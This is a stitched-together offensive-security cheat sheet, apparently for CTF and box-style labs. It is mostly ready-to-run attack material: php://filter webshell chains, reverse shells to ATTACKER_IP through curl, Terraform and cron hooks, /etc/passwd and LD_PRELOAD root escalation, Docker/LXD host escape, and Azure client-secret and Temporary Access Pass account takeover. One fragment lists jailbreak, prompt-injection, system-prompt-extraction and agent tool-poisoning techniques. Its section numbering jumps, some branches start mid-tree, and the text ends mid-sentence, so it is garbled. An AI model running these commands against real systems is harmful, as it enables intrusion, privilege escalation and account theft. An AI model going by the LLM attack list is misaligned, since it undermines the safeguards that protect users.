⚠ REMEMBER

If you've got LFI into an include()/require()-family sink and php://filter chains resolve at all, that's still enough for RCE — you don't need an upload feature or any writable path. The php_filter_chain_generator tool builds a chain of convert.iconv.* conversion filters that exploits PHP's own encoding-conversion error behavior to synthesize arbitrary bytes — including a working PHP payload — purely from the filter chain itself, no seed content required. Caveat: "php://filter works" only guarantees RCE if the vulnerable code actually executes the result (an include/require-family sink) rather than just displaying it (readfile(), file_get_contents()+echo) — those sinks will happily disclose source via base64-encode filters but will never run a generated PHP payload, they just print it as text. Confirm which kind of sink you have before assuming RCE is reachable.

LFI → Shell Walkthrough: php://filter Chain Generator

Quickest mental model — plain URL string: once you've generated the chain, it just gets pasted into the vulnerable parameter with your command tacked on after it. As a literal URL it looks like this:

http://target/vulnerable.php?file=<paste generated chain here>&c=id

i.e. the chain replaces the normal file path value, and &c=id is just a second query parameter appended right after it — same as adding any other parameter to any other URL. Everything below is that same idea, just automated through curl so you don't have to hand-paste/encode a multi-kilobyte string yourself.

# 1. Clone the tool (pure Python 3 stdlib, no deps)
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator

# 2. Generate a chain that resolves to a minimal webshell — keep the embedded
#    PHP as short as possible, generation time scales with payload length
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>' > chain.txt

# 3. Confirm the sink actually executes (not just displays) the result —
#    curl's --data-urlencode handles all the special-character encoding for you,
#    no manual URL-encoding needed
curl -G "http://target/vulnerable.php" \
  --data-urlencode "file@chain.txt" \
  --data-urlencode "c=id"
# if you see uid=...(www-data)... in the response, you have RCE through an
# include-family sink — proceed. If instead you see raw PHP source text with
# no command output, the sink only displays content; this technique won't
# get you further on that parameter

# 4. Start a listener
nc -lvnp 4444

# 5. Swap the confirmation command for a reverse shell one-liner — same
#    curl invocation, --data-urlencode again removes any need to hand-encode
curl -G "http://target/vulnerable.php" \
  --data-urlencode "file@chain.txt" \
  --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

Testing straight from a browser address bar (before scripting it) works too — paste the chain after the vulnerable parameter, then append &c=id in the same bar and hit enter; browsers auto-encode most special characters in typed/pasted URLs. Check the raw response via View Page Source (Ctrl+U) rather than the rendered page, since command output often doesn't render visibly in the HTML body. If the chain is long enough to hit address-bar or URL-length limits, switch to curl as in the steps above — it's more reliable once payloads get large, and removes any encoding guesswork entirely.

Step 5: Authorization bypass (IDOR / BAC / privilege escalation via the app itself)

Distinguish the two failure modes up front: - Authentication bypass — getting in without valid creds at all (not this section). - Authorization bypass (Broken Access Control) — you're logged in, but you can act on/view data or functions you shouldn't be able to. This is one of the highest-yield bug classes in web CTFs because it's rarely automatable and requires manual, methodical testing.

Authz testing workflow
├─ Map every endpoint + role combo first (unauth, low-priv user, admin if creatable)
│   → capture each request in Burp, save to a dedicated project/site map
├─ Horizontal privilege escalation (same role, different user's data)
│   ├─ IDOR: swap object IDs in URL/body/params you don't own
│   │   e.g. /api/orders/1042 → try 1041, 1043, or your own ID off-by-one
│   ├─ Try both numeric AND non-sequential IDs (UUID) — some apps only "protect"
│   │   the ID format, not the actual authorization check
│   └─ Check every HTTP verb per endpoint (GET protected but PUT/DELETE not checked)
├─ Vertical privilege escalation (lower role reaching higher-role functionality)
│   ├─ Direct object/URL access to admin-only pages while authenticated as low-priv
│   │   (/admin/panel, /api/admin/users) even if UI hides the link
│   ├─ Parameter-based role tampering: role=user → role=admin in request body/JWT/cookie
│   ├─ Mass assignment: add unexpected fields to a request body
│   │   (isAdmin=true, role=admin) that the backend blindly binds to the model
│   └─ Forced browsing: guess/fuzz admin paths even with no visible link
│       (ffuf -u http://target/FUZZ -w admin-panels.txt)
├─ Method/path confusion bypass techniques (when a direct request IS blocked)
│   ├─ Case manipulation: /Admin, /ADMIN, /admin/
│   ├─ Trailing characters: /admin/, /admin.., /admin%20, /admin/.
│   ├─ URL encoding tricks: /%61dmin (a = %61), double encoding /%2561dmin
│   ├─ Path confusion via extra segments: /admin/../admin, /./admin
│   ├─ Header-based bypass: X-Original-URL, X-Rewrite-URL, X-Forwarded-For:127.0.0.1
│   ├─ Verb switching: if POST /admin/delete is blocked, try GET, PUT, or
│   │   override with X-HTTP-Method-Override: DELETE
│   └─ Send request via a different Host header or through a whitelisted internal path
├─ Multi-step process bypass (workflow/state manipulation)
│   ├─ Skip steps: jump directly to a later step's endpoint (e.g. checkout confirm
│   │   without completing payment step) if state isn't server-side enforced
│   └─ Replay/reuse: reuse a token/step from one flow (e.g. password reset) in
│       another user's flow if the token isn't properly bound to that user/session
├─ JWT/session-based authz bypass
│   ├─ Decode JWT (jwt.io / jwt_tool) — check for role/permission claims client can't
│   │   trust the server to re-verify server-side
│   ├─ alg:none, weak HMAC secret, kid header injection (see Crypto/JWT row above)
│   └─ Session fixation: does the app accept an attacker-supplied session ID pre-login?
└─ Confirm impact: read/modify/delete another user's or admin's data → that's the flag
    vector; document exactly which request achieved it (useful for the writeup)

Step 6: File upload bypass

The earlier decision tree flags upload features as a branch point — here's the actual testing methodology and payloads.

Upload bypass workflow
├─ First, just try uploading a raw webshell — many CTF uploaders have zero validation
│   PHP: <?php system($_GET['c']); ?>   saved as shell.php
├─ Extension filtering in place?
│   ├─ Blacklist (blocks .php but not variants)?
│   │   → try alternate executable extensions the server still parses:
│   │     .phtml .php3 .php4 .php5 .php7 .pht .phar .inc
│   │   → try case variation: .PHP .PhP (if filesystem/server is case-insensitive)
│   │   → double extension: shell.jpg.php, shell.php.jpg (depends which side strips)
│   │   → null byte (old PHP <5.3.4 or via multipart trickery): shell.php%00.jpg
│   │   → trailing tricks: shell.php., shell.php%20, shell.php::$DATA (IIS/NTFS ADS)
│   └─ Whitelist (only allows .jpg/.png/etc.)?
│       → check if upload dir is still web-accessible AND server executes based on
│         content-type/config rather than strict extension (e.g. .htaccess trick below)
│       → .htaccess upload (if allowed as a file) to redefine handler:
│         AddType application/x-httpd-php .jpg
│       → look for a SECOND vuln to rename the file post-upload (path traversal,
│         arbitrary rename API) back to something executable
├─ Content-Type / MIME check only (client or server-side)?
│   → burp Repeater: change Content-Type header to image/png/image/jpeg while keeping
│     the .php extension and PHP payload body — many checks only inspect this header
├─ Magic byte / file signature check?
│   → prepend valid image magic bytes to your payload (polyglot file):
│     GIF89a;<?php system($_GET['c']); ?>     (valid GIF header + PHP payload)
│   → generate proper polyglots with `exiftool` (embed payload in EXIF comment of a
│     real JPEG, then find an LFI to include it) or `weevely`/`msfvenom`-generated
│     polyglot images for phpMyAdmin/ImageMagick-style challenges
├─ Server-side re-encoding (image resize/re-compress on upload)?
│   → usually kills simple polyglots; look for a parser-specific bug instead
│     (e.g. ImageTragick CVE-2016-3714 for ImageMagick, exploited via crafted
│     MVG/SVG file that triggers command execution during processing)
├─ Path traversal in filename field?
│   → filename="../../var/www/html/shell.php" if filename isn't sanitized, to
│     write outside the intended upload directory
├─ Upload directory not web-executable, but IS readable?
│   → chain with an LFI elsewhere on the site to include your uploaded file
│     (php://filter or direct include of /uploads/shell.jpg parsed as PHP via LFI)
├─ Race condition on upload?
│   → server validates then moves file (TOCTOU window) — rapidly re-request the
│     file at its predictable temp/final path before validation deletes it
│     (Burp Turbo Intruder / ffuf with high concurrency during upload+access)
├─ Zip/archive upload that gets extracted server-side?
│   → zip slip: craft an archive with `../../` in entry filenames to write outside
│     the extraction directory
├─ SVG upload allowed?
│   → SVGs can contain <script> (stored XSS) or XXE payloads if parsed as XML
├─ Size/quantity limits only, no content validation?
│   → confirms it's worth spending time on the bypasses above rather than elsewhere
└─ Once shell lands: confirm exact upload path (check response body / predictable
    naming pattern / directory listing) then request it directly to trigger execution

Step 8: Web cache poisoning / deception + XS-Leaks (increasingly common in current CTFs)

├─ Cache poisoning: find an unkeyed input (header/param the cache ignores but the
│   origin server uses) → inject a malicious value → poisoned response gets cached
│   and served to other victims. Test with X-Forwarded-Host, X-Forwarded-Scheme,
│   or any custom header, using Burp's "Param Miner" extension to auto-discover
│   unkeyed inputs.
├─ Cache DECEPTION (the inverse): trick the cache into storing a *victim's*
│   personalized/sensitive response under an attacker-guessable cache key —
│   e.g. request /account/settings/nonexistent.css and see if the cache stores
│   the real account page because it only keys on the static-looking extension.
│   Send the crafted link to a victim, then request the same URL yourself to
│   read their cached response.
├─ Internal cache poisoning: poisoning caches that sit *inside* the
│   application stack (e.g. a framework's internal Next.js/edge cache) rather
│   than a conventional CDN — check framework-specific rendering/cache
│   internals if a standard CDN poisoning attempt fails.
└─ XS-Leaks (cross-site leaks): infer cross-origin information without classic
    XSS/CORS misconfig, purely from observable side channels — response
    timing, response size (e.g. via compression oracle or Content-Length),
    frame counting, or error-event firing on <script>/<img> loads. Useful when
    direct data exfiltration is blocked by SOP/CORS but a boolean or numeric
    leak is enough to win the challenge. Reference: xsleaks.dev for the full
    technique catalog.

Step 9: Prototype pollution (Node.js / client-side JS apps)

├─ Server-side: find a recursive merge/clone/extend of user-controlled JSON
│   (lodash.merge, jQuery.extend, custom deep-merge) → inject
│   {"__proto__": {"polluted": true}} and check if it affects unrelated objects
├─ Confirm impact by finding a "gadget" — existing code that reads a property
│   you can now pollute in a way that changes behavior (e.g. a template engine
│   reading a config flag, or a spawned child_process picking up an env-like
│   property) → escalate pollution to RCE or auth bypass
├─ Client-side: pollute via URL fragment/query parsing libraries, then chain
│   into DOM XSS if a polluted property is later used in an innerHTML sink
└─ Tools: Burp's "Server-Side Prototype Pollution Scanner" extension automates
    black-box detection without needing source access

Note — Web LLM / AI-integration bugs: if the target is an LLM-backed web app (chatbot, RAG search, AI agent endpoint), treat prompt injection as a first-class web bug class in its own right — see the AI/LLM Security category (Section 8) below for the dedicated methodology.

Step 10: Less-common injection classes and auth-forgery techniques worth checking

├─ SAML signature bypass / assertion forgery
│   — if SSO is backed by SAML, check the library version for known signature-
│   validation bugs (several SAML libraries across languages have shipped
│   flaws letting you forge an assertion claiming to be any user without a
│   valid signing key). Treat "how is the signature actually validated" as
│   worth checking any time SAML is in the stack, the same way you'd check a
│   JWT library version
├─ JWT/JWE forgery using only a PUBLIC key (no server secret needed)
│   — some JWT/JWE libraries have shipped bugs that let you forge a token
│   that passes verification using only the server's published public key,
│   bypassing what should be an asymmetric-signature guarantee entirely.
│   Always check library CVEs for whatever JWT/JWE library is in use, not
│   just alg:none/weak-HMAC-secret style attacks
├─ Cypher injection (Neo4j / graph databases)
│   — same conceptual bug as SQL injection, but for graph query languages.
│   If the backend is a graph DB (Neo4j is most common), test the same
│   injection probes (quote-breaking, boolean-based blind, UNION-equivalent)
│   adapted to Cypher syntax rather than SQL
├─ Template-eval injection beyond classic SSTI
│   — Python f-string/format-string evaluation sinks (a value passed through
│   an f-string or .format() built from untrusted XML/JSON input) can expose
│   arbitrary Python expression evaluation, distinct from a full Jinja2/Twig
│   engine — same impact as SSTI, different signature to look for in code
├─ SSRF into non-HTTP binary wire protocols
│   — don't assume an SSRF primitive is limited to fetching HTTP URLs; if the
│   SSRF-reachable host speaks a binary protocol (message queues like Kafka,
│   Redis, Memcached, etc.), crafting raw protocol bytes through the SSRF
│   channel can reach much further than a simple internal HTTP GET would
├─ Bash arithmetic-context injection
│   — if a script passes user input into a Bash arithmetic context
│   (double parens (( )) or an array/variable subscript), Bash evaluates that
│   context as an expression and can execute embedded command substitutions
│   — a frequently-missed injection surface distinct from classic
│   quote-breaking command injection
├─ LFI-to-RCE upgrade tricks when you can only read files, not upload
│   ├─ PEAR pearcmd.php chain — on PHP hosts with PEAR installed, LFI-including
│   │   pearcmd.php combined with PHP's register_argc_argv setting lets you
│   │   pass CLI-style arguments through the URL to have PEAR write a
│   │   malicious file to disk, then include that file to execute it
│   └─ PHP filter chain generator (see the ⚠ REMEMBER callout above) — an
│       entirely wrapper-based technique (no upload required) that chains
│       convert.iconv.* php://filter conversions to synthesize arbitrary
│       file content, including valid PHP, from nothing at all — see
│       github.com/synacktiv/php_filter_chain_generator
├─ WebAuthn/passkey registration via XSS
│   — if you land stored XSS on a privileged session, don't stop at cookie
│   theft: a script running in that session's origin can also complete a
│   WebAuthn/passkey registration ceremony, silently binding an
│   attacker-controlled authenticator to the victim account for durable,
│   credential-free persistent access
└─ Known recent framework/CVE-driven auth bypasses worth checking versions for
    ├─ Next.js middleware authorization bypass (CVE-2025-29927) — a crafted
    │   header can cause Next.js to skip middleware-enforced auth checks
    │   entirely on affected versions
    └─ PHP-CGI "best-fit" encoding RCE on Windows (CVE-2024-4577) — Windows
        locale best-fit character conversion lets specific byte sequences
        smuggle a CGI argument injection past PHP-CGI's own escaping

Study "how2heap" (github.com/shellphish/how2heap) for tcache poisoning, fastbin dup, unsorted-bin attack templates — copy the pattern matching the glibc version in use (strings libc.so.6 | grep "GNU C Library").

Modern glibc mitigations you must account for (2.32+, i.e. Ubuntu 20.04+/22.04): - Safe-Linking (glibc ≥2.32): tcache/fastbin fd pointers are XOR-masked with (heap_base >> 12) before being stored, so a raw overwrite of fd with an arbitrary target no longer works directly. You need a heap-address leak first, then compute mask = (leaked_ptr >> 12) ^ target_addr to forge a valid poisoned pointer. Standard pwntools helper pattern: python def safe_link(ptr, pos): return ptr ^ (pos >> 12) fake_fd = safe_link(target_addr, chunk_addr) - __malloc_hook/__free_hook/__realloc_hook were removed entirely in glibc 2.34 — the classic "overwrite __free_hook with system" one-liner no longer exists on any current distro. Modern goals instead: - GOT overwrite (if partial RELRO) — still the simplest option when available. - FSOP (File Stream Oriented Programming) / House of Apple / House of Kiwi — corrupt a FILE structure (e.g. _IO_2_1_stdout_) via vtable/jump-table hijack to get control on exit()/fclose()/next stdio call. This is now the standard glibc ≥2.34 heap-to-RCE path; study _IO_FILE_plus layout and _IO_file_jumps in the target's libc. - __exit_funcs / _IO_wide_data corruption as alternate FSOP variants when the direct vtable is checked (glibc validates _IO_FILE vtables land within valid ranges since 2.24 — _IO_validate_vtable — so exploits now typically pivot into _IO_str_jumps/_IO_wstr_jumps or use IO_FILE_plus_STDOUT "House of Apple" chains to satisfy the check). - Tcache double-free check (glibc ≥2.29): a key field detects trivial same-chunk double frees — bypass by freeing an intermediate different chunk between the two frees of the target, or corrupt the key field directly if you have a separate write primitive. - Practical implication: always confirm the exact glibc version shipped with the challenge (./libc.so.6 or patchelf'd binary) before reusing an "old" writeup's technique — a script written against 2.27 usually won't run unmodified against 2.35+.

7. NETWORK SERVICES — SMB / NetBIOS / RPC Recon & Exploitation

Extremely common in "box" style CTFs (HTB, TryHackMe, OSCP-style) as the very first foothold vector on Windows/AD targets, and often present on mixed Linux boxes running Samba. Treat this as the standard pre-shell recon phase whenever ports 135, 137-139, or 445 are open.

7.1 Decision Tree

Ports 135/139/445 (and/or 137 UDP) open
├─ Unauthenticated enumeration first — always try null/guest sessions before
│   assuming credentials are required
│   ├─ Null session works? → enumerate users/groups/shares/policy for free
│   └─ Guest disabled / null session refused? → note it, move to auth-required branch
├─ Enumerate shares
│   ├─ Any share readable anonymously or with found creds?
│   │   └─ Mount/list it → hunt for configs, scripts, credentials, SAM/SYSTEM
│   │       hive backups, unattended install files
│   └─ Writable share found?
│       └─ Drop a payload (webshell if IIS/web root, or a scheduled-task-triggered
│           binary) — writable + service restart/cron pickup = code exec
├─ RPC enumeration (rpcclient / Impacket) reachable?
│   ├─ Anonymous RPC bind succeeds → user/group/domain enumeration via
│   │   SAMR pipe even when SMB shares themselves are locked down
│   └─ LSA/SAMR queries reveal domain password policy → informs safe
│       brute-force thresholds (avoid lockout) for later credential attacks
├─ Have valid (or low-priv) domain credentials already?
│   ├─ Password spray across discovered usernames (respecting lockout policy)
│   ├─ Kerberoasting / AS-REP roasting if domain-joined (see AD notes below)
│   └─ Re-run share/RPC enumeration authenticated — much more opens up
├─ SMB signing disabled?
│   └─ NTLM relay attack surface — relay captured/coerced auth to another
│       host that accepts it (see relay section below)
├─ Known vulnerable SMB version/patch level?
│   └─ Check for EternalBlue-class or version-specific RCEs (see CVE table below)
├─ NetBIOS name service (UDP 137) reachable?
│   └─ nbtstat/nmblookup for hostname, domain, and MAC — useful for host ID
│       even when SMB itself is locked down
└─ Got a foothold via any of the above → pivot to Windows Privesc (Section 13)
    or Linux Privesc (Section 12) if the target turned out to be Samba-on-Linux

│   ├─ Authority override: claim to be a system/developer message overriding
│   │   prior instructions
│   ├─ Roleplay/reframing: "continue this story", "pretend you are X" to shift
│   │   the model out of its guarded persona
│   ├─ Obfuscation: character-splitting, leetspeak, or synonym substitution to
│   │   slip past keyword-based input/output filters
│   ├─ Priming/completion attacks: force the model to begin its answer with a
│   │   fixed prefix, exploiting next-token prediction to bypass refusal
│   └─ False-premise correction: assert an incorrect "fact" about the model's
│       own instructions and let its urge to correct you leak real details
├─ Indirect prompt injection
│   └─ Plant instructions inside content the model will ingest as data (a
│       webpage the agent browses, a PDF it summarizes, a support ticket it
│       triages) — the model fails to distinguish "data to summarize" from
│       "commands to obey"
├─ System prompt / instruction extraction
│   └─ Ask the model to repeat, translate, summarize, or "debug" its own
│       instructions; incremental leakage via repeated reframed questions
│       often works even when direct requests are blocked
├─ Tool-calling / agentic exploitation
│   ├─ Tool poisoning / shadowing: if the agent trusts tool descriptions from
│   │   an untrusted source (e.g. an MCP server), a malicious tool description
│   │   can redirect the agent's behavior without touching the user prompt
│   ├─ Excessive agency: check whether the agent will chain an "innocent" tool
│   │   call sequence into an unintended sensitive action (read file → email
│   │   its contents externally, when only "read" was authorized)
│   └─ Confused deputy: get the agent to perform an action on your behalf that
│       you couldn't do directly, by hiding the request inside data it trusts
├─ Output-sink chaining (treat LLM output like any other untrusted input)
│   └─ If the LLM's response is later rendered as HTML/markdown or passed to
│       another system unsanitized, classic web bugs apply downstream — e.g. a
│       model tricked into emitting a crafted <img>/<script> tag becomes a
│       stored-XSS primitive once rendered in the chat UI
└─ Model-level attacks (less common in jeopardy CTFs, more in dedicated AI/ML
    tracks): model inversion, membership inference, adversarial examples
    against classifiers, training-data poisoning

9. CLOUD & SUPPLY CHAIN — Azure/Entra ID & CI/CD Infrastructure-as-Code Attacks

Increasingly common in current CTF/lab platforms (TryHackMe, Hack Smarter Labs) alongside classic box challenges. Two distinct but related attack surfaces: cloud identity/permission misconfigurations (Azure/Entra ID), and infrastructure-as-code pipelines that automatically execute code from pull requests.

9.1 Decision Tree

Given cloud/tenant access (creds, portal login, or CLI token)
├─ Azure/Entra ID engagement?
│   ├─ Enumerate every identity you can see: users, service principals, app
│   │   registrations, and their role assignments — the goal is finding an
│   │   over-privileged App Registration or a role that grants more than the
│   │   owning user realizes
│   ├─ Check App Registrations for API permissions that grant identity control
│   │   (anything like UserAuthenticationMethod.ReadWrite.All, RoleManagement.*,
│   │   Application.ReadWrite.All) — owning the app == owning that permission
│   ├─ Can you authenticate as the owner of an over-privileged app?
│   │   └─ Add your own client secret to that app → get an app-only Graph API
│   │       token → use the app's permissions directly, independent of your
│   │       own (lower) user permissions
│   ├─ Got a Graph token with identity-management rights?
│   │   └─ Issue a Temporary Access Pass (TAP) for a higher-value user →
│   │       authenticate as them without ever knowing/resetting their password
│   └─ Once impersonating a higher-priv user, re-check role assignments —
│       Azure RBAC roles (Network Contributor, VM Data Access Administrator,
│       etc.) are often split across multiple low-priv users specifically so
│       no single account looks dangerous alone; chaining them is the point
├─ CI/CD / Infrastructure-as-Code (Terraform, Atlantis, GitLab CI, GitHub
│   Actions, Jenkins) reachable?
│   ├─ Find every git hosting instance (Gitea/GitLab/GitHub) and enumerate
│   │   public/anonymous-readable repos first — IaC repos routinely leak
│   │   backend config (state file storage location) even when the state
│   │   file itself isn't in the repo
│   ├─ Terraform backend defined (S3/Azure Storage/GCS)? → attempt direct
│   │   unauthenticated access to that bucket/container — state files are
│   │   plaintext by default and routinely contain provisioned secrets
│   │   (SSH keys, cloud credential material, connection strings)
│   ├─ IaC automation bot present (Atlantis, GitLab CI, Terraform Cloud
│   │   webhook runner)? → these tools apply Terraform/Ansible/etc.
│   │   automatically when a pull/merge request is opened or commented on —
│   │   if you can push a branch and open a PR against an allow-listed repo,
│   │   you can get the automation to execute arbitrary code as whatever
│   │   identity the runner uses (often a highly privileged service account
│   │   or root on the runner host itself)
│   └─ No direct push access? → check whether any leaked credential
│       (SSH key from a state file, a bot token found in process listings/
│       environment variables) grants push rights over the token/UI path
└─ Once you have host or cloud-API access → pivot into standard Linux/Windows

9.2 Azure / Entra ID Enumeration & Abuse

Standard enumeration flow once you have any valid credential (portal password, CLI-only account, or a leaked access token):

# CLI login (works even for accounts with no subscription access)
az login --username user@tenant.onmicrosoft.com --allow-no-subscriptions

# Enumerate role assignments for the current identity
az role assignment list --assignee user@tenant.onmicrosoft.com --all

# Enumerate App Registrations and their owners
az ad app list --query "[].{name:displayName, appId:appId, id:id}"
az ad app owner list --id <app-object-id>

# Check an app's Graph API permissions — this is the step that reveals whether
# an app is over-privileged relative to what it should be able to do
az ad app permission list --id <app-id>

If you own (or can take over) an over-privileged app, mint your own client secret rather than trying to recover the existing one — this works even when the existing secret's value is no longer retrievable through the portal:

az ad app credential reset --id <app-id> --append --display-name "pwn" --years 1

# Exchange the new secret for an app-only Graph token
curl -X POST https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=<app-id>" \
  -d "client_secret=<new-secret-value>" \
  -d "grant_type=client_credentials" \
  -d "scope=https://graph.microsoft.com/.default"

With a Graph token that carries an identity-management permission (e.g. authentication-method write access), the highest-value move is usually issuing a Temporary Access Pass for a target user rather than resetting their password — a TAP is a time-limited passwordless credential, so it doesn't trip password-change alerts and doesn't require knowing anything about the target's existing login:

TOKEN=<graph-access-token>

curl -X POST https://graph.microsoft.com/v1.0/users/<target-upn>/authentication/temporaryAccessPassMethods \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"lifetimeInMinutes": 60, "isUsableOnce": false}'

Use the returned TAP value as the sign-in "password" for that user at the normal login page — no MFA challenge follows a TAP-based sign-in. Once impersonating a higher-privileged identity, re-enumerate role assignments (az role assignment list) — Azure environments frequently split dangerous capability across multiple identities (e.g. one user can manage networking, another can manage VM data access) so that no single compromised account looks alarming in isolation; the privesc path is usually chaining two or three such roles together via TAP-based lateral movement rather than finding one master credential.

9.3 CI/CD & Infrastructure-as-Code Supply Chain Attacks

Modern CTF labs increasingly model real supply-chain risk: a git host plus an automation bot (Atlantis, GitLab CI, Terraform Cloud) that executes IaC changes automatically. The methodology is consistent regardless of which specific tool is in play:

├─ Enumerate git hosting for IaC repositories (Terraform/Ansible/CloudFormation)
│   — even a read-only/public repo is worth pulling, since backend
│   configuration blocks reveal exactly where remote state lives
├─ Locate the remote state backend definition (look for a "backend" block in
│   a Terraform "terraform {}" configuration, or equivalent for other tools)
│   and attempt direct, unauthenticated access to that storage location
├─ If the state file is retrievable, treat it as a full secrets dump:
│   it routinely contains generated SSH private keys, cloud access keys,
│   database connection strings, and complete infrastructure topology in
│   plaintext, because Terraform state is not encrypted or redacted by default
├─ Identify the automation bot's trigger mechanism and allow-listed repos
│   (process listing, config files, or the bot's own web UI usually reveal
│   this) — most PR-automation bots execute a plan/apply cycle automatically
│   on new pull requests or on a specific comment trigger phrase
└─ If you can push a branch to an allow-listed repo (via a leaked credential,
    stolen SSH key, or a token with write access), craft a minimal malicious
    IaC resource that shells out on apply, open a PR, and trigger the bot —
    this typically runs as a highly privileged local/service account on the
    automation host itself, well beyond whatever the git platform's own
    permission model would normally allow you to do directly
# Generic "provisioner shells out" pattern for Terraform-based automation bots —
# a null_resource with a local-exec provisioner runs arbitrary shell commands
# on whatever host executes `terraform apply`
resource "null_resource" "pwn" {
  provisioner "local-exec" {
    command = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
  }
}

git push --set-upstream origin pwn

├─ Landed a shell inside a pod (via an app-level RCE)? Treat it as a scoped

13. LINUX PRIVESC

1.1 Decision Tree

Low-priv Linux shell
├─ whoami / id / groups → note any unusual group membership (docker, lxd, disk, adm)
├─ sudo -l → any NOPASSWD or GTFOBins-listed binary? → instant win, check GTFOBins
├─ SUID/SGID binaries present?
│   └─ find / -perm -4000 2>/dev/null → cross-ref every result against GTFOBins
├─ Cron jobs running as root with writable script/path? → hijack
├─ Writable /etc/passwd or /etc/shadow? → add root user directly
├─ Kernel version outdated? → check known CVEs (careful: can crash the box)
├─ Capabilities set on binaries (getcap)? → e.g. cap_setuid on python
├─ NFS with no_root_squash? → mount and create SUID binary from attacker box
├─ Docker/LXD group membership? → container escape to host root
├─ Interesting env vars / PATH hijack opportunities? → writable dir in $PATH before real binary
├─ Credentials lying around (configs, .bash_history, backup files)?
├─ Root-owned process with writable binary/library (LD_PRELOAD hijack)?
└─ Still stuck → re-run full enum script, diff against checklist below, check for
    custom/internal software running as root (ps aux)

1.2 Enumeration — Manual Checklist

# Identity & privileges
id; whoami; groups
sudo -l                                   # check what you can run as root
cat /etc/passwd | grep -v nologin         # valid shell users

# SUID / SGID binaries
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID

# Capabilities (often missed vs SUID)
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
find / -writable -path "*cron*" 2>/dev/null

# World-writable files/dirs owned by root or run as root
find / -writable -type f 2>/dev/null | grep -v "^/proc"
find / -perm -o+w -type d 2>/dev/null

# Kernel/OS version
uname -a; cat /etc/os-release; cat /proc/version

# Running processes (look for root processes you can interact with)
ps aux | grep root

# Network services bound locally
ss -tulpn

# Credentials lying around
find / -iname "*.bak" -o -iname "*password*" -o -iname "*.git" 2>/dev/null
grep -ri "password" /etc/*.conf 2>/dev/null
cat ~/.bash_history
find / -name "*.kdbx" -o -name "id_rsa*" 2>/dev/null

# Credentials passed as CLI args/env vars — these get captured in shell
# history, auth.log (via the "sudo ... COMMAND=" line, if run with sudo),
# and process listings (ps aux) for as long as the process is alive
grep -riE "PASSWORD=|_PASS=|SECRET=|_TOKEN=|-e .*PASS" /var/log/auth.log* 2>/dev/null
zgrep -riE "PASSWORD=|_PASS=|SECRET=" /var/log/auth.log*.gz 2>/dev/null
ps auxww | grep -iE "pass|secret|token"
history | grep -iE "docker run|mysql -p|psql"
# any credential found this way is worth testing directly against su/ssh for
# every local user — CTF boxes very commonly reuse the same password across
# a database/service and the account that configured it
su otheruser        # try the recovered credential here first
ssh otheruser@target # or here, if su isn't available/works differently

# NFS exports
cat /etc/exports 2>/dev/null

# Docker / LXD group check
id | grep -E "docker|lxd"

1.4 Exploitation by Vector

GTFOBins (sudo/SUID abuse)

# example: sudo -l shows you can run `find` as root
sudo find . -exec /bin/sh \; -quit
# example: SUID on python
find / -perm -4000 2>/dev/null | grep python
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

Always check https://gtfobins.github.io for the exact binary found — it lists the SUID / sudo / capabilities / shell payload for hundreds of binaries.

Cron hijack

# if a root cron runs a world-writable script:
echo 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"' >> /path/to/writable_script.sh
# if the cron runs a script via a PATH-relative binary and PATH is writable/hijackable:
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /dev/shm/binary_name
chmod +x /dev/shm/binary_name
export PATH=/dev/shm:$PATH

Writable /etc/passwd

openssl passwd -1 -salt xyz password123
echo 'hacker:$1$xyz$generatedhash:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker

Kernel exploits (last resort — can crash the target)

uname -a                       # get exact version
searchsploit linux kernel <version>
# well-known: DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847), PwnKit (CVE-2021-4034)

Capabilities abuse

getcap -r / 2>/dev/null | grep cap_setuid
# e.g. python3 with cap_setuid+ep
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Docker group → host root

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

LXD group → host root

lxc init ubuntu:18.04 test -c security.privileged=true
lxc config device add test host-root disk source=/ path=/mnt/root recursive=true
lxc start test; lxc exec test /bin/sh

LD_PRELOAD (when sudo -l shows env_keep+=LD_PRELOAD)

// preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash -p"); }

gcc -fPIC -shared -nostartfiles -o preload.so preload.c
sudo LD_PRELOAD=/path/preload.so <allowed_binary>

NFS no_root_squash

# on attacker box, as root, if a share is exported with no_root_squash
mount -o rw,vers=3 target:/share /mnt/share
cp /bin/bash /mnt/share/rootbash
chmod +s /mnt/share/rootbash
# on target
/share/rootbash -p

Packet-capture capability = credential sniffing

# if non-root users can run tcpdump (via group membership, capability, or a
# permissive setuid/setcap grant), sniff local loopback/interface traffic for
# cleartext creds passed between local services
getcap /usr/bin/tcpdump
tcpdump -i lo -A -s0 'tcp' 2>/dev/null | grep -iE "pass|user|auth"

systemd drop-in + polkit restart abuse

# if you have write access to a service's systemd drop-in directory AND a
# polkit rule permits your user to restart that service, add a pre-start
# hook that creates a SUID shell before the service (re)starts as root
mkdir -p /etc/systemd/system/<service>.service.d
cat > /etc/systemd/system/<service>.service.d/override.conf <<EOF
[Service]
ExecStartPre=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
EOF
systemctl daemon-reload
systemctl restart <service>   # allowed by the polkit rule even as non-root
/tmp/rootbash -p

PAM/polkit local-console spoofing + malicious filesystem mount (udisks2)

├─ A PAM environment-variable misconfiguration can convince Polkit that your
│   session is a "physically present" local console session even when it
│   isn't, unlocking policies gated on that condition
├─ Combined with a udisks2/libblockdev vulnerability, this can let you mount
│   a crafted filesystem image (e.g. a malformed XFS image) that carries a
